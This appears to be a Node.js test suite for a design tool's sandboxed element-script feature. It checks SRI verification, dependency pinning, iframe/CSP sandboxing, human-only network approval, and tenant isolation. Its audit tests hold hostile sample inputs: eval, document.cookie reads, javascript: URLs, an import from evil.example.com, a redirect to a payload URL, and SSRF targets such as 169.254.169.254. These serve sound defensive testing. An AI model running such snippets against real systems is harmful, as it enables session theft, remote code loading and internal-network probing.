/**
 * M11 Sensor Suite — Sandboxed Custom Element JS & Verified Public JS Supply Chain (`uiux_element_script`).
 *
 * Verifies:
 * 1. Policy & CDN Subresource Integrity (`sha384`) verification, SRI mismatch rejection, redirect-to-untrusted-origin
 *    blocking, and 2 MB payload ceiling.
 * 2. End-to-end workflow for `design` keys (`principal.strict === true`) & project keys: creating scripted elements,
 *    cloning public elements (`copyIfForeign: true`) + attaching verified CDN modules, `lockfilePackages` enforcement,
 *    opaque-origin `<iframe sandbox="allow-scripts" referrerpolicy="no-referrer">` HTML + nonce CSP (`connect-src 'none'`),
 *    `uiux_get_item { format: "html" }`, `uiux_create_bundle` (`scripts/elements/<key>.mjs`), and `ExportService` (`js/elements/<key>.mjs` + `DEV-NOTES.md`).
 * 3. Static security audit & supply-chain guardrails: blocks `eval`, `new Function`, string timers, `document.cookie`,
 *    `parent.document`, `localStorage`, `javascript:`, undeclared imports, unpinned semver (`latest`, `^`, `~`, `*`),
 *    untrusted CDN domains, URL-to-`package@version` spoofing, SSRF private/loopback `allowedConnectOrigins`, MCP
 *    self-approval of `allowNetwork: true` (`needs-human-review` vs human browser approval), read-only scope blocks,
 *    immutable public library protection, and cross-tenant isolation.
 * 4. Changeset staging (`uiux_stage_item`), `contentHash` sensitivity to script edits, `uiux_restore_version` rollback,
 *    Trash delete/restore preservation of `element_scripts`, and `uiux_api_call` parity.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { buildContainer } from '../../composition-root.js';
import { createHttpServer } from '../../interfaces/http/server.js';
import { computeSriHash } from '../../domain/element-script.js';

const here = dirname(fileURLToPath(import.meta.url));

const CONFETTI_ESM = 'export default function confetti(opts = {}) { return { fired: true, count: opts.particleCount || 50 }; }\n';
const CONFETTI_SRI = computeSriHash(CONFETTI_ESM);

function makeMockFetch(routes = {}) {
  return async (url, opts = {}) => {
    const entry = routes[url];
    if (!entry) {
      return new Response('not found', { status: 404 });
    }
    if (entry.redirectTo) {
      return new Response('', {
        status: entry.status || 302,
        headers: { location: entry.redirectTo }
      });
    }
    const body = entry.body ?? '';
    return new Response(body, {
      status: entry.status || 200,
      headers: entry.headers || { 'content-type': 'application/javascript; charset=utf-8' }
    });
  };
}

async function world(fetchRoutes = {}) {
  const c = buildContainer({ dbFile: ':memory:', syncEnabled: false });
  c.importer.ensurePresets(['html-tabs-vertical']);
  c.elementScripts.fetchImpl = makeMockFetch({
    'https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/+esm': { body: CONFETTI_ESM },
    ...fetchRoutes
  });

  const ada = c.auth.register({ username: 'ada', email: 'ada@example.com', password: 'secret123' });
  const bob = c.auth.register({ username: 'bob', email: 'bob@example.com', password: 'secret123' });
  const adaProj = c.projects.create({ name: 'Ada Reverse App', visibility: 'private' }, { actor: ada.user });
  const bobProj = c.projects.create({ name: 'Bob Secret App', visibility: 'private' }, { actor: bob.user });

  const accFull = c.mcp.apiKeys.create({ name: 'ada-full', kind: 'account', scopes: ['read', 'propose', 'request', 'create'] }, ada.user).key;
  const accRead = c.mcp.apiKeys.create({ name: 'ada-read', kind: 'account', scopes: ['read'] }, ada.user).key;
  const designKey = c.mcp.apiKeys.create({ name: 'ada-design', kind: 'account', scopes: ['read', 'propose', 'create', 'design'] }, ada.user).key;
  const projFull = c.mcp.apiKeys.create({ name: 'ada-proj', projectId: adaProj.id, scopes: ['read', 'propose', 'request'] }, ada.user).key;

  const server = createHttpServer(c, { webRoot: join(here, '..', '..', 'interfaces', 'web'), domainRoot: join(here, '..', '..', 'domain') });
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${server.address().port}`;

  let id = 0;
  const rpc = async (method, params = {}, bearer = accFull) => (await (await fetch(`${base}/mcp`, {
    method: 'POST',
    headers: { authorization: `Bearer ${bearer}`, 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: ++id, method, params })
  })).json());
  const call = async (name, args = {}, bearer = accFull) =>
    (await rpc('tools/call', { name, arguments: args }, bearer)).result;
  const ok = async (name, args = {}, bearer = accFull) => {
    const r = await call(name, args, bearer);
    assert.ok(!r.isError, `${name} failed: ${r.content?.[0]?.text}`);
    return r.structuredContent;
  };
  const err = async (name, args = {}, bearer = accFull) => {
    const r = await call(name, args, bearer);
    assert.equal(r.isError, true, `${name} should have failed (${JSON.stringify(args)})`);
    return r.structuredContent.error;
  };

  return {
    c, ada, bob, adaProj, bobProj, accFull, accRead, designKey, projFull, base,
    rpc, call, ok, err,
    close: () => { server.close(); c.close(); }
  };
}

test('M11.1: policy & CDN SRI verification, mismatch rejection, untrusted redirect block, and size cap', async () => {
  const bigBody = 'export const x = "' + 'a'.repeat(2 * 1024 * 1024 + 64) + '";';
  const w = await world({
    'https://esm.sh/evil-redir@1.0.0': { redirectTo: 'https://evil.example.com/payload.js' },
    'https://unpkg.com/huge-lib@1.0.0/index.js': { body: bigBody }
  });
  try {
    const pol = await w.ok('uiux_element_script', { action: 'policy' }, w.accRead);
    assert.equal(pol.policy.sandbox.iframeSandbox, 'allow-scripts');
    assert.equal(pol.policy.sandbox.allowSameOrigin, false);
    assert.ok(pol.policy.publicJsRules.allowedOrigins.includes('https://cdn.jsdelivr.net'));

    // Dry-run verify + auto-compute sha384 SRI from allowlisted CDN
    const ver = await w.ok('uiux_element_script', {
      action: 'verify',
      verifyIntegrity: true,
      requireIntegrity: true,
      lockfilePackages: { 'canvas-confetti': '1.9.3' },
      moduleCode: `import confetti from 'canvas-confetti';\nexport function mount(container, props, bridge) {\n  container.addEventListener('click', () => bridge.emit('celebrate', confetti({ particleCount: 24 })));\n}`,
      imports: [{ package: 'canvas-confetti', version: '1.9.3', specifier: 'canvas-confetti' }],
      emits: ['celebrate']
    }, w.accRead);
    assert.equal(ver.script.reviewStatus, 'verified');
    assert.equal(ver.script.imports[0].integrity, CONFETTI_SRI);
    assert.equal(ver.script.sriVerified, true);

    // SRI mismatch is rejected with SRI_MISMATCH
    const badSri = await w.err('uiux_element_script', {
      action: 'verify',
      verifyIntegrity: true,
      moduleCode: `import confetti from 'canvas-confetti';\nexport function mount() { return confetti; }`,
      imports: [{
        package: 'canvas-confetti',
        version: '1.9.3',
        specifier: 'canvas-confetti',
        integrity: 'sha384-' + 'A'.repeat(64)
      }]
    }, w.accRead);
    assert.equal(badSri.code, 'SRI_MISMATCH');

    // Redirect from allowlisted CDN to untrusted host is blocked hop-by-hop
    const redirErr = await w.err('uiux_element_script', {
      action: 'verify',
      verifyIntegrity: true,
      moduleCode: `import x from 'evil-redir';\nexport function mount() { return x; }`,
      imports: [{ package: 'evil-redir', version: '1.0.0', cdn: 'esm.sh', url: 'https://esm.sh/evil-redir@1.0.0' }]
    }, w.accRead);
    assert.match(redirErr.message, /left allowlisted origins/i);

    // Oversized (>2 MB) CDN module is aborted
    const sizeErr = await w.err('uiux_element_script', {
      action: 'verify',
      verifyIntegrity: true,
      moduleCode: `import x from 'huge-lib';\nexport function mount() { return x; }`,
      imports: [{ package: 'huge-lib', version: '1.0.0', cdn: 'unpkg', url: 'https://unpkg.com/huge-lib@1.0.0/index.js' }]
    }, w.accRead);
    assert.match(sizeErr.message, /exceeds maximum allowed size/i);
  } finally {
    w.close();
  }
});

test('M11.2: design-key reverse-engineering flow — clone public element, attach verified JS, sandbox HTML/CSP, bundle & app export', async () => {
  const w = await world();
  try {
    // Focus Ada's project using her strict AI-assisted design key
    await w.ok('uiux_edit_project', { project: w.adaProj.key }, w.designKey);

    // Pick a public element from Public Library and clone-on-write via uiux_element_script { copyIfForeign: true }
    const pubSearch = await w.ok('uiux_public_library', { onlyElements: true, limit: 5 }, w.designKey);
    assert.ok(pubSearch.items.length > 0, 'expected seeded public elements');
    const pubEl = pubSearch.items[0];

    const setRes = await w.ok('uiux_element_script', {
      action: 'set',
      ref: pubEl.key,
      copyIfForeign: true,
      verifyIntegrity: true,
      requireIntegrity: true,
      includeSandbox: true,
      lockfilePackages: { 'canvas-confetti': '1.9.3' },
      moduleCode: `import confetti from 'canvas-confetti';\nexport function mount({ root, svg, props, emit }) {\n  if (svg) svg.setAttribute('data-mounted', '1');\n  root.addEventListener('click', () => emit('burst', confetti({ particleCount: props.count || 30 })));\n}`,
      imports: [{ package: 'canvas-confetti', version: '1.9.3', specifier: 'canvas-confetti' }],
      propsSchema: { count: { type: 'integer', default: 30 } },
      emits: ['burst']
    }, w.designKey);

    assert.equal(setRes.copiedFromForeign, true);
    assert.equal(setRes.script.imports[0].integrity, CONFETTI_SRI);
    assert.equal(setRes.sandbox.iframeAttributes.sandbox, 'allow-scripts');
    assert.ok(!setRes.sandbox.iframeAttributes.sandbox.includes('allow-same-origin'));
    assert.equal(setRes.sandbox.iframeAttributes.referrerpolicy, 'no-referrer');
    assert.match(setRes.sandbox.csp, /default-src 'none'/);
    assert.match(setRes.sandbox.csp, /connect-src 'none'/);
    assert.match(setRes.sandbox.csp, /https:\/\/cdn\.jsdelivr\.net/);
    assert.match(setRes.sandbox.html, /<script type="importmap" nonce="/);
    assert.ok(setRes.sandbox.html.includes(CONFETTI_SRI));

    // Original public library element remains untouched without any script
    const pubCheck = await w.ok('uiux_element_script', { action: 'get', ref: pubEl.uid }, w.designKey);
    assert.equal(pubCheck.attached, false);

    // uiux_get_item { format: "html" } embeds opaque-origin sandboxed iframe, never raw host-origin execution
    const itemHtml = await w.ok('uiux_get_item', {
      type: 'element',
      ref: setRes.item.uid,
      format: 'html'
    }, w.designKey);
    assert.match(itemHtml.html, /<iframe[^>]*sandbox="allow-scripts" referrerpolicy="no-referrer"/);
    assert.ok(!itemHtml.html.includes('allow-same-origin'));

    // Place the scripted element on a screen so ExportService & BundleService include it
    const scr = await w.ok('uiux_create_item', {
      type: 'screen',
      name: 'Celebration Screen',
      key: 'celebration-screen',
      width: 390,
      height: 844,
      descriptionDev: 'PURPOSE: Tests exported scripted element.',
      mcpContext: { purpose: 'Test screen' },
      nodes: [{
        kind: 'instance',
        name: 'confetti-card',
        ref: { type: 'element', uid: setRes.item.uid },
        x: 20,
        y: 80,
        width: 240,
        height: 120
      }]
    }, w.designKey);
    assert.equal(scr.item.key, 'celebration-screen');

    // BundleService emits scripts/elements/<key>.mjs + items/element/<key>.json with script
    const principal = { ...w.c.mcp.apiKeys.authenticate(w.projFull), project: w.adaProj };
    const { files: bundleFiles } = w.c.mcp.bundles.files(principal, { includeApp: true });
    const scriptFile = bundleFiles.find(f => f.path === `scripts/elements/${setRes.item.key}.mjs`);
    assert.ok(scriptFile, 'expected scripts/elements/<key>.mjs in MCP bundle');
    assert.match(scriptFile.content, /import confetti from 'canvas-confetti'/);

    const appExport = w.c.exporter.buildBundle({ screenIds: [w.c.screen.get('celebration-screen').id] });
    const appModFile = appExport.files.find(f => f.path === `js/elements/${setRes.item.key}.mjs`);
    assert.ok(appModFile, 'expected js/elements/<key>.mjs in exported HTML app');
    const devNotes = appExport.files.find(f => f.path === 'DEV-NOTES.md');
    assert.ok(devNotes.content.includes('npm install --save-exact canvas-confetti@1.9.3'));
    assert.ok(devNotes.content.includes(CONFETTI_SRI));
  } finally {
    w.close();
  }
});

test('M11.3: static security audit, supply-chain blocks, SSRF block, human-only network approval & tenant isolation', async () => {
  const w = await world();
  try {
    const created = await w.ok('uiux_create_item', {
      type: 'element',
      name: 'Interactive Widget',
      key: 'interactive-widget',
      width: 200,
      height: 100,
      descriptionDev: 'PURPOSE: Widget.',
      mcpContext: { purpose: 'Widget' }
    }, w.projFull);
    const elKey = created.item.key;

    // 1. Forbidden JS constructs are blocked by static audit
    const badSnippets = [
      ['eval("alert(1)")', /eval/i],
      ['const fn = new Function("return 1");', /Function/i],
      ['setTimeout("alert(1)", 10);', /timer/i],
      ['const c = document.cookie;', /cookie/i],
      ['parent.document.body.innerHTML = "";', /parent|top/i],
      ['localStorage.setItem("k", "v");', /storage|localStorage/i],
      ['location.href = "javascript:alert(1)";', /javascript:/i],
      ['import x from "https://evil.example.com/malicious.js";', /import/i],
      ['import secret from "undeclared-pkg";', /undeclared/i]
    ];
    for (const [snippet, pattern] of badSnippets) {
      const e = await w.err('uiux_element_script', {
        action: 'set',
        ref: elKey,
        moduleCode: `${snippet}\nexport function mount() {}`
      }, w.projFull);
      assert.match(e.message, pattern, `expected snippet to fail with ${pattern}: ${snippet}`);
    }

    // 2. Supply-chain rejections: floating semver, untrusted CDN, URL-to-pkg@ver spoofing, lockfile mismatch, missing required SRI
    for (const badVer of ['latest', '*', '^1.9.3', '~1.9.3']) {
      const e = await w.err('uiux_element_script', {
        action: 'verify',
        moduleCode: 'import c from "canvas-confetti"; export function mount() { return c; }',
        imports: [{ package: 'canvas-confetti', version: badVer }]
      }, w.projFull);
      assert.match(e.message, /exact semver/i);
    }

    const untrustedCdn = await w.err('uiux_element_script', {
      action: 'verify',
      moduleCode: 'import c from "canvas-confetti"; export function mount() { return c; }',
      imports: [{ package: 'canvas-confetti', version: '1.9.3', url: 'https://evil.example.com/npm/canvas-confetti@1.9.3/+esm' }]
    }, w.projFull);
    assert.match(untrustedCdn.message, /allowed public CDNs/i);

    const spoofUrl = await w.err('uiux_element_script', {
      action: 'verify',
      moduleCode: 'import c from "canvas-confetti"; export function mount() { return c; }',
      imports: [{ package: 'canvas-confetti', version: '1.9.3', url: 'https://cdn.jsdelivr.net/npm/evil-pkg@1.0.0/+esm' }]
    }, w.projFull);
    assert.match(spoofUrl.message, /canvas-confetti@1\.9\.3/);

    const lockMismatch = await w.err('uiux_element_script', {
      action: 'verify',
      lockfilePackages: { 'canvas-confetti': '1.9.2' },
      moduleCode: 'import c from "canvas-confetti"; export function mount() { return c; }',
      imports: [{ package: 'canvas-confetti', version: '1.9.3' }]
    }, w.projFull);
    assert.match(lockMismatch.message, /lockfile/i);

    const missingSri = await w.err('uiux_element_script', {
      action: 'verify',
      requireIntegrity: true,
      moduleCode: 'import c from "canvas-confetti"; export function mount() { return c; }',
      imports: [{ package: 'canvas-confetti', version: '1.9.3' }]
    }, w.projFull);
    assert.match(missingSri.message, /integrity/i);

    // 3. SSRF protection on capabilities.allowedConnectOrigins
    for (const badOrigin of ['http://api.example.com', 'https://localhost:8080', 'https://127.0.0.1', 'https://169.254.169.254', 'https://192.168.1.20']) {
      const e = await w.err('uiux_element_script', {
        action: 'verify',
        moduleCode: 'export function mount() {}',
        capabilities: { allowNetwork: true, allowedConnectOrigins: [badOrigin] }
      }, w.projFull);
      assert.match(e.message, /HTTPS|private|loopback|local/i);
    }

    // 4. MCP keys CANNOT self-approve allowNetwork: true -> stays `needs-human-review` with `connect-src 'none'`!
    const netViaMcp = await w.ok('uiux_element_script', {
      action: 'set',
      ref: elKey,
      includeSandbox: true,
      moduleCode: 'export function mount({ emit }) { emit("ready", {}); }',
      capabilities: { allowNetwork: true, allowedConnectOrigins: ['https://api.example.com'] }
    }, w.projFull);
    assert.equal(netViaMcp.script.reviewStatus, 'needs-human-review');
    assert.match(netViaMcp.sandbox.csp, /connect-src 'none'/);

    // Human browser session approving `humanApproved: true` promotes reviewStatus to `verified` and unlocks the HTTPS origin
    const humanApprove = await fetch(`${w.base}/api/elements/${created.item.id || w.c.element.get(elKey).id}/script`, {
      method: 'PUT',
      headers: {
        'content-type': 'application/json',
        cookie: `uid_session=${w.ada.token}`
      },
      body: JSON.stringify({
        moduleCode: 'export function mount({ emit }) { emit("ready", {}); }',
        capabilities: { allowNetwork: true, allowedConnectOrigins: ['https://api.example.com'] },
        humanApproved: true
      })
    });
    assert.equal(humanApprove.status, 200);
    const humanJson = await humanApprove.json();
    assert.equal(humanJson.script.reviewStatus, 'approved');
    const afterHuman = await w.ok('uiux_element_script', { action: 'get', ref: elKey, includeSandbox: true }, w.projFull);
    assert.match(afterHuman.sandbox.csp, /connect-src https:\/\/api\.example\.com/);

    // 5. Read-only key cannot mutate; public elements cannot be mutated in-place; Bob's elements are isolated
    const readBlocked = await w.err('uiux_element_script', {
      action: 'set',
      project: w.adaProj.key,
      ref: elKey,
      moduleCode: 'export function mount() {}'
    }, w.accRead);
    assert.equal(readBlocked.code, 'SCOPE_DENIED');

    const pubList = await w.ok('uiux_public_library', { onlyElements: true, limit: 1 }, w.projFull);
    await w.err('uiux_element_script', {
      action: 'set',
      ref: pubList.items[0].uid,
      copyIfForeign: false,
      moduleCode: 'export function mount() {}'
    }, w.projFull);

    const bobEl = w.c.element.create({
      name: 'Bob Private Card',
      key: 'bob-private-card',
      projectId: w.bobProj.id,
      visibility: 'project'
    }, { actor: w.bob.user });
    await w.err('uiux_element_script', {
      action: 'get',
      project: w.adaProj.key,
      ref: bobEl.uid
    }, w.accFull);
    await w.err('uiux_element_script', {
      action: 'set',
      project: w.bobProj.key,
      ref: bobEl.uid,
      moduleCode: 'export function mount() {}'
    }, w.accFull);
  } finally {
    w.close();
  }
});

test('M11.4: changeset staging, contentHash sensitivity, version restore, Trash restore & uiux_api_call parity', async () => {
  const w = await world();
  try {
    await w.ok('uiux_edit_project', { project: w.adaProj.key }, w.designKey);

    // Stage a new scripted element via changeset / design edit session and save as v2
    await w.ok('uiux_stage_item', {
      item: {
        type: 'element',
        key: 'chart-sparkline',
        name: 'Chart Sparkline',
        label: 'Sparkline',
        width: 240,
        height: 80,
        descriptionDev: 'PURPOSE: Sparkline element with custom JS.',
        mcpContext: { purpose: 'Sparkline chart' },
        nodes: [{ index: 0, parentIndex: null, kind: 'shape', tag: 'rect', name: 'bg', role: 'surface', attrs: { x: 0, y: 0, width: 240, height: 80, rx: 12, fill: '{{surface}}' } }],
        script: {
          moduleCode: 'export function mount({ svg }) { if (svg) svg.dataset.v = "1"; }',
          emits: ['hover-point']
        }
      }
    }, w.designKey);
    const v2 = await w.ok('uiux_save', { message: 'Add chart-sparkline with v1 script' }, w.designKey);
    assert.equal(v2.saved, true);

    const itemV2 = await w.ok('uiux_get_item', { type: 'element', ref: 'chart-sparkline' }, w.designKey);
    assert.ok(itemV2.script);
    assert.match(itemV2.script.moduleCode, /dataset\.v = "1"/);
    const hashV2 = itemV2.contentHash;

    // Update only the script in v3 -> contentHash must change!
    await w.ok('uiux_stage_item', {
      item: {
        type: 'element',
        key: 'chart-sparkline',
        name: 'Chart Sparkline',
        label: 'Sparkline',
        width: 240,
        height: 80,
        descriptionDev: 'PURPOSE: Sparkline element with custom JS.',
        mcpContext: { purpose: 'Sparkline chart' },
        nodes: [{ index: 0, parentIndex: null, kind: 'shape', tag: 'rect', name: 'bg', role: 'surface', attrs: { x: 0, y: 0, width: 240, height: 80, rx: 12, fill: '{{surface}}' } }],
        script: {
          moduleCode: 'export function mount({ svg }) { if (svg) svg.dataset.v = "2"; }',
          emits: ['hover-point', 'select-point']
        }
      }
    }, w.designKey);
    const v3 = await w.ok('uiux_save', { message: 'Update script to v2' }, w.designKey);
    assert.equal(v3.saved, true);

    const itemV3 = await w.ok('uiux_get_item', { type: 'element', ref: 'chart-sparkline' }, w.designKey);
    assert.notEqual(itemV3.contentHash, hashV2, 'contentHash must change when element script changes');
    assert.match(itemV3.script.moduleCode, /dataset\.v = "2"/);

    // Restore version v2 -> script rolls back to v1 with identical contentHash!
    await w.ok('uiux_restore_version', { version: v2.version, message: 'Rollback to v1 script' }, w.designKey);
    const restored = await w.ok('uiux_get_item', { type: 'element', ref: 'chart-sparkline' }, w.designKey);
    assert.match(restored.script.moduleCode, /dataset\.v = "1"/);
    assert.equal(restored.contentHash, hashV2);

    // Delete to Trash and restore -> element_scripts is preserved!
    const del = await w.ok('uiux_delete_item', { type: 'element', ref: 'chart-sparkline' }, w.designKey);
    assert.ok(del.trashId);
    const unDel = await w.ok('uiux_delete_item', { restore: true, trashId: del.trashId }, w.designKey);
    assert.equal(unDel.restored, true);
    assert.ok(unDel.item.script);
    assert.match(unDel.item.script.moduleCode, /dataset\.v = "1"/);

    // uiux_api_call parity for setElementScript / elementScriptSandbox / deleteElementScript
    const viaApi = await w.ok('uiux_api_call', {
      action: 'setElementScript',
      params: { id: 'chart-sparkline' },
      body: {
        moduleCode: 'export function mount({ emit }) { emit("api-set", { ok: true }); }',
        emits: ['api-set']
      }
    }, w.designKey);
    assert.equal(viaApi.result.script.emits[0].name, 'api-set');

    const sbViaApi = await w.ok('uiux_api_call', {
      action: 'elementScriptSandbox',
      params: { id: 'chart-sparkline' }
    }, w.designKey);
    assert.equal(sbViaApi.result.iframeAttributes.sandbox, 'allow-scripts');

    const delViaApi = await w.ok('uiux_api_call', {
      action: 'deleteElementScript',
      params: { id: 'chart-sparkline' }
    }, w.designKey);
    assert.equal(delViaApi.result.removed, true);
  } finally {
    w.close();
  }
});
